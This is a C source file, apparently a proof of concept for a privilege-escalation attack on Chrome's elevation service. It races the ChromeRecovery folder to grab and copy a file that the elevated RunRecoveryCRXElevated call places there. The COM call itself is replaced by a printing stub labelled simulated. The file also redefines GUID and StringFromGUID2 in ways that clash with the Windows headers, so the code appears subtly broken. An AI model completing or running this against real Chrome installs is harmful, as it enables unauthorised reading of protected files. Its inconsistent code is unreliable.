#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlwapi.h> // pro PathFindFileNameW

// estrutura pro GUID
typedef struct _GUID {
  unsigned long  Data1;
  unsigned short Data2;
  unsigned short Data3;
  unsigned char  Data4[8];
} GUID;

// guid2string
int StringFromGUID2(GUID guid, wchar_t *str, int len) {
  //snwprintf_s(str, len, _TRUNCATE, L"{%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}",
  //            guid.Data1, guid.Data2, guid.Data3,
  //            guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
  //            guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
  swprintf(str, len, L"{%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}",
              guid.Data1, guid.Data2, guid.Data3,
              guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
              guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);

  return 0;
}


typedef struct _IElevatorChromeVTable {
  HRESULT (*RunRecoveryCRXElevated)(void* this, wchar_t *arg1, wchar_t *arg2, wchar_t *arg3, wchar_t *arg4, DWORD arg5, ULONG_PTR *arg6);
} IElevatorChromeVTable;

typedef struct _IElevatorChrome {
  IElevatorChromeVTable *lpVtbl;
} IElevatorChrome;

HRESULT RunRecoveryCRXElevated_Stub(void* this, wchar_t *arg1, wchar_t *arg2, wchar_t *arg3, wchar_t *arg4, DWORD arg5, ULONG_PTR *arg6) {
  printf("* RunRecoveryCRXElevated_Stub called\n");
  printf("  Arguments: %ls, %ls, %ls, %ls, 0x%x\n", arg1, arg2, arg3, arg4, arg5);
  if (arg6 != NULL) {
    *arg6 = 0;
  }
  return 0;
}

IElevatorChrome* CreateIElevatorChrome() {
  IElevatorChrome *pObject = (IElevatorChrome *)malloc(sizeof(IElevatorChrome));
  if (pObject == NULL) return NULL;

  IElevatorChromeVTable *pVTable = (IElevatorChromeVTable *)malloc(sizeof(IElevatorChromeVTable));
    if (pVTable == NULL) {
      free(pObject);
      return NULL;
    }

  pVTable->RunRecoveryCRXElevated = RunRecoveryCRXElevated_Stub;
  pObject->lpVtbl = pVTable;

  return pObject;
}

void ReleaseIElevatorChrome(IElevatorChrome* obj) {
  if (obj != NULL) {
      if(obj->lpVtbl != NULL)
          free(obj->lpVtbl);
          
      free(obj);
  }
}



DWORD WINAPI watchFolderForFile(LPVOID fileName) {
    WIN32_FIND_DATAW findFileData;

    LPCWSTR recoveryFolder = L"C:\\Program Files (x86)\\Google\\Chrome\\ChromeRecovery";
    LPCWSTR subfolderPattern = L"C:\\Program Files (x86)\\Google\\Chrome\\ChromeRecovery\\scoped_dir*";
    WCHAR pathToFile[MAX_PATH];

    wcscpy_s(pathToFile, MAX_PATH, L"C:\\Program Files (x86)\\Google\\Chrome\\ChromeRecovery\\");

    HANDLE hNotification = FindFirstChangeNotificationW(recoveryFolder, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME);

    wprintf(L"* File changed notification set, waiting for folder creation\n");
    WaitForSingleObject(hNotification, INFINITE);
    wprintf(L"* Folder created\n");

    HANDLE hFolder = FindFirstFileW(subfolderPattern, &findFileData);

    if (hFolder != INVALID_HANDLE_VALUE) {
        wprintf(L"* Folder name is %s\n", findFileData.cFileName);

        wcscat_s(pathToFile, MAX_PATH, findFileData.cFileName);
        wcscat_s(pathToFile, MAX_PATH, L"\\");
        wcscat_s(pathToFile, MAX_PATH, (wchar_t *)fileName);

        HANDLE hFile = INVALID_HANDLE_VALUE;

        while (1) {
            hFile = CreateFileW(pathToFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE)
                break;
                Sleep(100);
        }

        wprintf(L"* Got exclusive handle to file\n");

        HANDLE hOutputFile = CreateFileW((wchar_t *)fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hOutputFile != INVALID_HANDLE_VALUE) {
            wprintf(L"* Copying file to current working directory\n");
            DWORD bytesRead = 0, bytesWritten;
            CHAR buffer[4096];

            do {
                ReadFile(hFile, buffer, 4096, &bytesRead, NULL);
                WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL);
            } while (bytesRead != 0);

            wprintf(L"* Copy complete, closing handles and returning\n");
            CloseHandle(hFile);
            CloseHandle(hOutputFile);
        } else {
            wprintf(L"* Failed to open handle to output file\n");
        }
    } else {
        wprintf(L"* Failed to get subfolder name\n");
    }

    FindClose(hFolder);
	FindCloseChangeNotification(hNotification);


    return 0;
}


int wmain(int argc, wchar_t **argv) {
    if (argc < 2) {
        wprintf(L"<filename to retrieve>\n");
        return -1;
    }

    wprintf(L"Attempting to retrieve file %s\n", argv[1]);

    LPWSTR targetFileName = PathFindFileNameW(argv[1]);

    HANDLE hThread = CreateThread(NULL, 0, watchFolderForFile, (void *)targetFileName, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"Failed to create thread.\n");
        return -1;
    }

    IElevatorChrome *pObject = CreateIElevatorChrome();
    if (pObject == NULL) {
        wprintf(L"Failed to create IElevatorChrome object (simulated).\n");
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);

        return -1;
    }

    GUID browser_appid_guid, session_id_guid;

    CoCreateGuid(&browser_appid_guid);
    CoCreateGuid(&session_id_guid);


    WCHAR wbrowser_appid[100], wsession_id[100];
    StringFromGUID2(browser_appid_guid, wbrowser_appid, 100);
    StringFromGUID2(session_id_guid, wsession_id, 100);

    wprintf(L"Using browser_appid %s\n", wbrowser_appid);
    wprintf(L"Using session_id %s\n", wsession_id);

    DWORD dwClientPID = GetCurrentProcessId();
    wprintf(L"Getting current PID, dwClientPID=0x%x\n", dwClientPID);

    WCHAR *browser_version = L"75.0.3770.142";
    ULONG_PTR ptr = NULL;

    HRESULT hr = pObject->lpVtbl->RunRecoveryCRXElevated(pObject, argv[1], wbrowser_appid, browser_version, wsession_id, dwClientPID, &ptr);

    wprintf(L"RunRecoveryCRXElevated returned 0x%x\n", (unsigned int)hr);

	ReleaseIElevatorChrome(pObject);

    wprintf(L"Waiting for copy thread to finish\n");
    WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);


    return 0;
}
